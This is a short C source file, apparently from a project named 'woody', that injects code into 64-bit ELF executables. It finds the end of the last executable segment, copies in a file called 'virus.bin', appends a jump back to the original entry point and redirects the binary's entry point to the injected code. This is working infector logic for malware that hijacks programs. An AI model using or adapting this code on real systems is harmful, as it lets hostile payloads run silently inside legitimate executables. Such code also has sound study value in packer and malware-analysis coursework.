#include "woody.h"

static int		inject_code(Elf64_Ehdr *map, int maxaddr, int maxoff)
{
	int		fd;
	void		*binary_virus;
	long long int	size;

	fd = open_file("virus.bin", &size, O_RDONLY);
	if (fd < 0)
		return -1;
	binary_virus = mmap(NULL, size + 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (binary_virus == MAP_FAILED) {
		perror("mmap virus.bin");
		close(fd);
		return -1;
	}
	*((char *)((void *)map + maxoff + size)) = 0xe9;
	*((int *)((void *)map + maxoff + size + 1)) = map->e_entry - (maxaddr + 5 + size);
	map->e_entry = maxaddr;
	memcpy((void *)map + maxoff, binary_virus, size);
	munmap(binary_virus, size);
	close(fd);
	return 0;
}

int	parse_ph_64(Elf64_Ehdr *map)
{
	Elf64_Phdr	*tmp;
	unsigned int	maxaddr;
	int		maxoff;
	int		i;

	maxaddr = 0x0;
	maxoff = 0x0;
	if (map->e_phnum > 0) {
		tmp = (Elf64_Phdr *)((void *)map + map->e_phoff);
		for (i = 0; i < map->e_phnum; i++) {
			if (maxaddr < tmp->p_vaddr + tmp->p_memsz) {
				if (tmp->p_flags & (PF_X > 0)) {
					maxaddr = tmp->p_vaddr + tmp->p_memsz;
					maxoff = tmp->p_offset + tmp->p_filesz;
				}
			}
			tmp++;
		}
	}
	if (maxaddr == 0)
		return -1;
	return inject_code(map, maxaddr, maxoff);
}
